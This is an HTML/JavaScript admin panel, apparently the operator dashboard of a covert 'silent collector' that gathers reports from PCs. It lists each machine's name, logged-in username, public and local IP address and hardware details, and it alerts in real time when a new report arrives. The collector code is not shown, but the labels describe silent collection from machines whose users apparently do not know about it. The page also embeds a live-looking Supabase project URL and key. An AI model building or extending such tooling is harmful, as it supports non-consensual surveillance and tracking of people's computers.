<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>lies.lat · admin panel · PC tracker</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  background: #000;
  color: #fff;
  font-family: 'SF Mono', 'Fira Code', monospace;
}
::-webkit-scrollbar { width: 3px; }
::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); }

/* Auth */
#page-auth {
  height: 100vh; display: flex; align-items: center;
  justify-content: center; flex-direction: column;
}
.auth-box {
  display: flex; flex-direction: column;
  align-items: center; gap: 18px; width: 260px;
}
.auth-wordmark {
  font-size: 11px; letter-spacing: 8px;
  text-transform: lowercase; color: rgba(255,255,255,0.2);
}
.auth-wordmark span { color: rgba(255,255,255,0.6); }
.auth-err {
  font-size: 9px; color: rgba(255,80,80,0.6);
  min-height: 12px;
}
.auth-sub {
  font-size: 9px; letter-spacing: 2px; color: rgba(255,255,255,0.15);
  cursor: pointer;
}
.auth-sub:hover { color: rgba(255,255,255,0.4); }
input {
  background: transparent; border: none;
  border-bottom: 1px solid rgba(255,255,255,0.1);
  color: #fff; font-family: inherit; font-size: 12px;
  padding: 9px 0; width: 100%;
}
input:focus { outline: none; border-color: rgba(255,255,255,0.3); }

.btn {
  background: transparent;
  border: 1px solid rgba(255,255,255,0.1);
  color: rgba(255,255,255,0.4);
  font-family: inherit; font-size: 9px;
  letter-spacing: 3px; text-transform: uppercase;
  padding: 9px 24px; cursor: pointer;
  transition: 0.2s;
}
.btn:hover { border-color: rgba(255,255,255,0.25); color: rgba(255,255,255,0.7); }
.btn-accent { border-color: rgba(255,255,255,0.15); color: rgba(255,255,255,0.5); }
.btn-accent:hover { border-color: rgba(255,255,255,0.35); color: #fff; }
.btn-danger { border-color: rgba(255,50,50,0.2); color: rgba(255,80,80,0.5); }
.btn-danger:hover { border-color: rgba(255,50,50,0.5); color: rgba(255,80,80,0.9); }
.btn-sm { padding: 5px 12px; font-size: 8px; letter-spacing: 2px; }

/* App */
#page-app { display: none; }
.topbar {
  position: sticky; top: 0;
  background: rgba(0,0,0,0.95);
  backdrop-filter: blur(12px);
  border-bottom: 1px solid rgba(255,255,255,0.05);
  height: 48px; display: flex; align-items: center;
  padding: 0 32px;
}
.wordmark {
  font-size: 11px; letter-spacing: 5px;
  color: rgba(255,255,255,0.2);
}
.wordmark span { color: rgba(255,255,255,0.55); }
.topbar-user {
  font-size: 10px; letter-spacing: 1px;
  color: rgba(255,255,255,0.2);
  margin-left: 20px;
}
.topbar-signout {
  margin-left: auto;
  background: none; border: none;
  color: rgba(255,255,255,0.15);
  font-size: 9px; letter-spacing: 2px;
  cursor: pointer;
}
.topbar-signout:hover { color: rgba(255,80,80,0.5); }

.main { max-width: 1400px; margin: 0 auto; padding: 40px 32px; }

.dash-title {
  font-size: 9px; letter-spacing: 6px;
  color: rgba(255,255,255,0.12);
  margin-bottom: 32px;
  display: flex; align-items: center; gap: 12px;
}
.dash-title::after {
  content: ''; flex: 1; height: 1px;
  background: rgba(255,255,255,0.05);
}

/* Stats */
.stats-grid {
  display: grid; grid-template-columns: repeat(5,1fr);
  gap: 1px; background: rgba(255,255,255,0.06);
  margin-bottom: 48px;
}
.stat-card {
  background: #000;
  padding: 20px 20px;
}
.stat-label {
  font-size: 8px; letter-spacing: 3px;
  color: rgba(255,255,255,0.2);
  margin-bottom: 8px;
}
.stat-number {
  font-size: 32px; font-weight: 300;
  color: rgba(255,255,255,0.7);
}

/* Filters */
.filters {
  display: flex; gap: 12px; margin-bottom: 24px;
  flex-wrap: wrap;
}
.filter-input {
  border: 1px solid rgba(255,255,255,0.1);
  padding: 6px 12px;
  font-size: 9px;
  background: transparent;
  color: #fff;
  width: 200px;
}
.filter-input::placeholder { color: rgba(255,255,255,0.2); }

/* PC Cards */
.specs-grid {
  display: grid; grid-template-columns: repeat(auto-fill, minmax(360px,1fr));
  gap: 12px; margin-top: 16px;
}
.spec-card {
  border: 1px solid rgba(255,255,255,0.06);
  background: rgba(255,255,255,0.01);
  transition: 0.2s;
}
.spec-card:hover { border-color: rgba(255,255,255,0.12); background: rgba(255,255,255,0.02);}
.spec-header {
  display: flex; align-items: center; gap: 12px;
  padding: 14px 16px;
  border-bottom: 1px solid rgba(255,255,255,0.05);
}
.spec-icon { font-size: 22px; }
.spec-name {
  font-size: 13px; font-weight: 400;
  color: rgba(255,255,255,0.75);
  cursor: pointer;
  flex: 1;
}
.spec-name:hover { text-decoration: underline; }
.spec-time {
  font-size: 8px; letter-spacing: 1px;
  color: rgba(255,255,255,0.2);
}
.spec-body {
  padding: 12px 16px;
  font-size: 10px;
  color: rgba(255,255,255,0.4);
  line-height: 1.6;
}
.spec-body strong { color: rgba(255,255,255,0.7); }
.spec-ip {
  margin-top: 8px;
  padding-top: 6px;
  border-top: 1px solid rgba(255,255,255,0.04);
  font-size: 9px;
  color: rgba(255,255,255,0.25);
}
.card-actions {
  display: flex;
  justify-content: flex-end;
  gap: 8px;
  padding: 8px 16px 12px;
  border-top: 1px solid rgba(255,255,255,0.04);
}
.empty-msg {
  padding: 60px 0; text-align: center;
  font-size: 10px; letter-spacing: 3px;
  color: rgba(255,255,255,0.08);
}

/* Modal */
.overlay {
  position: fixed; inset: 0; background: rgba(0,0,0,0.95);
  backdrop-filter: blur(8px); z-index: 200;
  opacity: 0; pointer-events: none; transition: 0.2s;
  display: flex; align-items: center; justify-content: center;
}
.overlay.open { opacity: 1; pointer-events: all; }
.modal {
  background: #0a0a0a; border: 1px solid rgba(255,255,255,0.08);
  max-width: 650px; width: 90%; max-height: 80vh; overflow-y: auto;
  padding: 28px 24px;
}
.modal-title {
  font-size: 10px; letter-spacing: 4px;
  margin-bottom: 20px; color: rgba(255,255,255,0.3);
}
.modal-close {
  float: right; background: none; border: none;
  color: rgba(255,255,255,0.2); font-size: 18px;
  cursor: pointer;
}
.delete-confirm {
  text-align: center;
  padding: 20px;
}
.delete-confirm p { margin: 20px 0; color: rgba(255,255,255,0.5); }
.delete-confirm .btn-danger { margin: 0 10px; }
pre {
  background: #111;
  padding: 12px;
  font-size: 8px;
  overflow-x: auto;
  margin-top: 10px;
}

#toast {
  position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
  background: rgba(255,255,255,0.05);
  border: 1px solid rgba(255,255,255,0.1);
  padding: 8px 20px; font-size: 9px; letter-spacing: 2px;
  opacity: 0; transition: 0.2s; z-index: 999;
  white-space: nowrap;
}
#toast.show { opacity: 1; }
</style>
</head>
<body>

<div id="page-loading" style="height:100vh;display:flex;align-items:center;justify-content:center;">
  <div style="width:3px;height:3px;background:rgba(255,255,255,0.2);"></div>
</div>

<div id="page-auth" style="display:none">
  <div class="auth-box">
    <div class="auth-wordmark">lies<span>.lat</span></div>
    <div id="auth-name-field" style="display:none">
      <input type="text" id="a-name" placeholder="display name">
    </div>
    <input type="email" id="a-email" placeholder="email">
    <input type="password" id="a-pass" placeholder="password">
    <div class="auth-err" id="auth-err"></div>
    <button class="btn" id="auth-submit-btn" onclick="authSubmit()">enter</button>
    <div class="auth-sub" id="auth-switch" onclick="authSwitch()">create account</div>
  </div>
</div>

<div id="page-app">
  <div class="topbar">
    <div class="wordmark">lies<span>.lat</span></div>
    <div class="topbar-user" id="topbar-user"></div>
    <button class="topbar-signout" onclick="doSignOut()">sign out</button>
  </div>

  <div class="main">
    <div class="dash-title">📡 PC REPORTS · SILENT COLLECTOR</div>
    
    <div class="stats-grid">
      <div class="stat-card"><div class="stat-label">total reports</div><div class="stat-number" id="stat-total">0</div></div>
      <div class="stat-card"><div class="stat-label">today</div><div class="stat-number" id="stat-today">0</div></div>
      <div class="stat-card"><div class="stat-label">unique PCs</div><div class="stat-number" id="stat-unique">0</div></div>
      <div class="stat-card"><div class="stat-label">avg RAM</div><div class="stat-number" id="stat-ram">—</div></div>
      <div class="stat-card"><div class="stat-label">last report</div><div class="stat-number" id="stat-last">—</div></div>
    </div>

    <div class="filters">
      <input type="text" id="filter-name" class="filter-input" placeholder="filter by PC name" onkeyup="filterReports()">
      <input type="text" id="filter-username" class="filter-input" placeholder="filter by username" onkeyup="filterReports()">
      <input type="text" id="filter-ip" class="filter-input" placeholder="filter by IP" onkeyup="filterReports()">
      <button class="btn btn-sm" onclick="fetchReports()">⟳ refresh</button>
      <button class="btn btn-sm btn-danger" onclick="deleteAllFiltered()" id="delete-all-btn" style="display:none">🗑 delete all filtered</button>
    </div>
    
    <div id="specs-container">
      <div class="empty-msg">waiting for reports from silent collector...</div>
    </div>
  </div>
</div>

<!-- Detail Modal -->
<div class="overlay" id="modal-detail" onclick="closeModalOnBg(event)">
  <div class="modal">
    <button class="modal-close" onclick="closeModal()">✕</button>
    <div class="modal-title">🔧 full system report</div>
    <div id="modal-content" style="font-size:10px; line-height:1.7;"></div>
  </div>
</div>

<!-- Delete Confirm Modal -->
<div class="overlay" id="modal-delete" onclick="closeDeleteModalOnBg(event)">
  <div class="modal" style="max-width:400px">
    <button class="modal-close" onclick="closeDeleteModal()">✕</button>
    <div class="delete-confirm">
      <div style="font-size:24px; margin-bottom:10px;">⚠️</div>
      <div class="modal-title">DELETE REPORT</div>
      <p id="delete-message">Are you sure you want to delete this report?</p>
      <div>
        <button class="btn btn-sm" onclick="closeDeleteModal()">cancel</button>
        <button class="btn btn-sm btn-danger" id="confirm-delete-btn" onclick="confirmDelete()">delete permanently</button>
      </div>
    </div>
  </div>
</div>

<div id="toast"></div>

<script>
const SB_URL = "https://jojyzviwhosnnkjbtbse.supabase.co";
const SB_KEY = "sb_publishable_14hdnZTp2eAhvbxjz0aKdA_rrcCNWwX";
const { createClient } = supabase;
const sb = createClient(SB_URL, SB_KEY);

let currentUser = null;
let allReports = [];
let filteredReports = [];
let pendingDeleteId = null;
let pendingDeleteAll = false;

async function init() {
  try {
    const { data: { session } } = await sb.auth.getSession();
    if (session) {
      currentUser = session.user;
      showApp();
      await fetchReports();
      subscribeToReports();
    } else {
      showPage('auth');
    }
    
    sb.auth.onAuthStateChange((ev, sess) => {
      if (ev === 'SIGNED_IN' && sess) {
        currentUser = sess.user;
        showApp();
        fetchReports();
        subscribeToReports();
      }
      if (ev === 'SIGNED_OUT') {
        currentUser = null;
        showPage('auth');
      }
    });
  } catch (err) {
    console.error('Init error:', err);
    document.getElementById('page-loading').style.display = 'none';
    document.getElementById('page-auth').style.display = 'flex';
  }
}

function subscribeToReports() {
  const channel = sb.channel('reports')
    .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'pc_reports' }, 
      (payload) => {
        allReports.unshift(payload.new);
        filterReports();
        updateStats();
        toast('📥 new PC report received!');
      })
    .on('postgres_changes', { event: 'DELETE', schema: 'public', table: 'pc_reports' },
      () => {
        fetchReports();
      })
    .subscribe();
}

function showPage(p) {
  document.getElementById('page-loading').style.display = 'none';
  document.getElementById('page-auth').style.display = p === 'auth' ? 'flex' : 'none';
  document.getElementById('page-app').style.display = p === 'app' ? 'block' : 'none';
}

function showApp() {
  showPage('app');
  const name = currentUser?.user_metadata?.display_name || currentUser?.email?.split('@')[0];
  document.getElementById('topbar-user').textContent = `@${name}`;
}

let authMode = 'login';
function authSwitch() {
  authMode = authMode === 'login' ? 'signup' : 'login';
  document.getElementById('auth-switch').textContent = authMode === 'login' ? 'create account' : 'sign in';
  document.getElementById('auth-submit-btn').textContent = authMode === 'login' ? 'enter' : 'create';
  document.getElementById('auth-name-field').style.display = authMode === 'signup' ? 'block' : 'none';
}

async function authSubmit() {
  const email = document.getElementById('a-email').value.trim();
  const pass = document.getElementById('a-pass').value;
  const name = document.getElementById('a-name').value.trim();
  const errEl = document.getElementById('auth-err');
  errEl.textContent = '';
  if (!email || !pass) { errEl.textContent = 'fill all fields'; return; }

  const btn = document.getElementById('auth-submit-btn');
  btn.disabled = true; 
  btn.textContent = '...';
  let error;
  
  if (authMode === 'login') {
    const result = await sb.auth.signInWithPassword({ email, password: pass });
    error = result.error;
  } else {
    if (pass.length < 6) { 
      errEl.textContent = 'password min 6 chars'; 
      btn.disabled=false; 
      btn.textContent='create'; 
      return; 
    }
    const result = await sb.auth.signUp({ 
      email, 
      password: pass, 
      options: { data: { display_name: name || email.split('@')[0] } } 
    });
    error = result.error;
    if (!error && result.data.user) {
      errEl.textContent = 'Account created! Please sign in.';
      authMode = 'login';
      authSwitch();
      btn.disabled = false;
      btn.textContent = 'enter';
      return;
    }
  }
  
  btn.disabled = false;
  btn.textContent = authMode === 'login' ? 'enter' : 'create';
  if (error) errEl.textContent = error.message;
  else if (authMode === 'signup') toast('account created! sign in');
}

async function doSignOut() { 
  await sb.auth.signOut(); 
}

async function fetchReports() {
  if (!currentUser) return;
  const { data, error } = await sb.from('pc_reports')
    .select('*')
    .order('created_at', { ascending: false });
  
  if (error) {
    if (error.code === '42P01') {
      document.getElementById('specs-container').innerHTML = '<div class="empty-msg">⚠️ run SQL setup first</div>';
    } else {
      console.error('Fetch error:', error);
    }
    return;
  }
  allReports = data || [];
  filterReports();
  updateStats();
}

function filterReports() {
  const nameFilter = document.getElementById('filter-name').value.toLowerCase();
  const userFilter = document.getElementById('filter-username').value.toLowerCase();
  const ipFilter = document.getElementById('filter-ip').value.toLowerCase();
  
  filteredReports = allReports.filter(r => {
    if (nameFilter && !(r.pc_name || '').toLowerCase().includes(nameFilter)) return false;
    if (userFilter && !(r.username || '').toLowerCase().includes(userFilter)) return false;
    if (ipFilter && (!(r.public_ip || r.local_ip || '').toLowerCase().includes(ipFilter))) return false;
    return true;
  });
  
  renderSpecs();
  
  const deleteAllBtn = document.getElementById('delete-all-btn');
  if (filteredReports.length > 0 && (nameFilter || userFilter || ipFilter)) {
    deleteAllBtn.style.display = 'inline-block';
    deleteAllBtn.textContent = `🗑 delete ${filteredReports.length} filtered`;
  } else {
    deleteAllBtn.style.display = 'none';
  }
}

function updateStats() {
  document.getElementById('stat-total').textContent = allReports.length;
  const today = new Date().toISOString().slice(0,10);
  const todayCount = allReports.filter(r => r.created_at?.startsWith(today)).length;
  document.getElementById('stat-today').textContent = todayCount;
  const unique = new Set(allReports.map(r => r.visitor_id || r.pc_name)).size;
  document.getElementById('stat-unique').textContent = unique;
  
  let totalRam = 0, ramCount = 0;
  allReports.forEach(r => {
    let val = parseFloat(r.memory_gb);
    if (!isNaN(val)) { totalRam += val; ramCount++; }
  });
  document.getElementById('stat-ram').textContent = ramCount > 0 ? Math.round(totalRam/ramCount) + ' GB' : '—';
  
  if (allReports.length > 0 && allReports[0].created_at) {
    const lastDate = new Date(allReports[0].created_at);
    const now = new Date();
    const diffHours = Math.floor((now - lastDate) / (1000 * 60 * 60));
    document.getElementById('stat-last').textContent = diffHours < 1 ? 'just now' : `${diffHours}h ago`;
  } else {
    document.getElementById('stat-last').textContent = '—';
  }
}

function renderSpecs() {
  const container = document.getElementById('specs-container');
  if (!filteredReports.length) {
    container.innerHTML = '<div class="empty-msg">no reports match filter</div>';
    return;
  }
  container.innerHTML = '<div class="specs-grid"></div>';
  const grid = container.querySelector('.specs-grid');
  
  filteredReports.forEach((rep) => {
    const raw = rep.raw_specs || {};
    const cpuInfo = raw.cpu || {};
    const ramInfo = raw.ram || {};
    const card = document.createElement('div');
    card.className = 'spec-card';
    card.innerHTML = `
      <div class="spec-header">
        <div class="spec-icon">💻</div>
        <div class="spec-name" onclick="showDetail('${rep.id}')">${escapeHtml(rep.pc_name || 'unknown')}</div>
        <div class="spec-time">${escapeHtml(rep.created_at?.slice(5,16) || '?')}</div>
      </div>
      <div class="spec-body">
        <div><strong>${escapeHtml(rep.platform || '?')}</strong> &nbsp;|&nbsp; 🧠 ${cpuInfo.cores || rep.cpu_cores || '?'} cores &nbsp;|&nbsp; 💾 ${ramInfo.total_gb || rep.memory_gb || '?'}</div>
        <div>👤 ${escapeHtml(rep.username || '?')}</div>
        <div class="spec-ip">🌐 ${escapeHtml(rep.public_ip || 'private')} &nbsp;|&nbsp; 🏠 ${escapeHtml(rep.local_ip || '?')}</div>
      </div>
      <div class="card-actions">
        <button class="btn btn-sm" onclick="showDetail('${rep.id}')">details</button>
        <button class="btn btn-sm btn-danger" onclick="promptDelete('${rep.id}', '${escapeHtml(rep.pc_name)}')">delete</button>
      </div>
    `;
    grid.appendChild(card);
  });
}

async function showDetail(id) {
  const report = allReports.find(r => r.id == id);
  if (!report) return;
  const raw = report.raw_specs || {};
  const modal = document.getElementById('modal-detail');
  const content = document.getElementById('modal-content');
  
  content.innerHTML = `
    <strong>🖥️ PC NAME</strong> ${escapeHtml(report.pc_name)}<br>
    <strong>👤 USERNAME</strong> ${escapeHtml(report.username)}<br>
    <strong>🆔 UNIQUE ID</strong> ${escapeHtml(report.visitor_id)}<br>
    <strong>🌍 PUBLIC IP</strong> ${escapeHtml(report.public_ip || '—')}<br>
    <strong>🏠 LOCAL IP</strong> ${escapeHtml(report.local_ip || '—')}<br>
    <strong>💿 OS</strong> ${escapeHtml(raw.os?.system)} ${escapeHtml(raw.os?.release)}<br>
    <strong>🧠 CPU</strong> ${raw.cpu?.cores || '?'} logical cores · ${raw.cpu?.physical_cores || '?'} physical<br>
    <strong>⚡ CPU USAGE</strong> ${raw.cpu?.usage_percent || '?'}%<br>
    <strong>💾 RAM</strong> ${raw.ram?.total_gb || '?'} GB total · ${raw.ram?.used_gb || '?'} GB used (${raw.ram?.usage_percent || '?'}%)<br>
    <strong>💽 DRIVES</strong> ${(raw.disks || []).map(d => `${d.drive}: ${d.total_gb}GB`).join(' · ') || '—'}<br>
    <strong>🎮 GPU</strong> ${(raw.gpu || []).map(g => g.name).join(', ') || '—'}<br>
    <strong>🔋 BATTERY</strong> ${raw.battery ? `${raw.battery.percent}% (${raw.battery.plugged ? 'Charging' : 'On battery'})` : '—'}<br>
    <strong>📅 REPORTED</strong> ${new Date(report.created_at).toLocaleString()}<br>
    <details><summary>📦 full JSON</summary><pre>${escapeHtml(JSON.stringify(raw, null, 2))}</pre></details>
  `;
  modal.classList.add('open');
}

function promptDelete(id, name) {
  pendingDeleteId = id;
  document.getElementById('delete-message').innerHTML = `Delete report from <strong>${escapeHtml(name)}</strong>?<br>This cannot be undone.`;
  document.getElementById('modal-delete').classList.add('open');
}

function deleteAllFiltered() {
  if (filteredReports.length === 0) return;
  pendingDeleteAll = true;
  document.getElementById('delete-message').innerHTML = `Delete <strong>${filteredReports.length}</strong> reports?<br>This cannot be undone.`;
  document.getElementById('modal-delete').classList.add('open');
}

async function confirmDelete() {
  if (pendingDeleteId) {
    const { error } = await sb.from('pc_reports').delete().eq('id', pendingDeleteId);
    if (!error) {
      toast('Report deleted');
      await fetchReports();
    } else {
      toast('Delete failed: ' + error.message);
    }
    pendingDeleteId = null;
  } else if (pendingDeleteAll) {
    const ids = filteredReports.map(r => r.id);
    let success = 0;
    for (const id of ids) {
      const { error } = await sb.from('pc_reports').delete().eq('id', id);
      if (!error) success++;
    }
    toast(`Deleted ${success}/${ids.length} reports`);
    await fetchReports();
    pendingDeleteAll = false;
  }
  closeDeleteModal();
}

function closeModal() { document.getElementById('modal-detail').classList.remove('open'); }
function closeModalOnBg(e) { if (e.target === document.getElementById('modal-detail')) closeModal(); }
function closeDeleteModal() { document.getElementById('modal-delete').classList.remove('open'); pendingDeleteId = null; pendingDeleteAll = false; }
function closeDeleteModalOnBg(e) { if (e.target === document.getElementById('modal-delete')) closeDeleteModal(); }

function toast(msg) {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.classList.add('show');
  setTimeout(() => el.classList.remove('show'), 2500);
}

function escapeHtml(str) {
  if (!str) return '';
  return String(str).replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));
}

init();
</script>
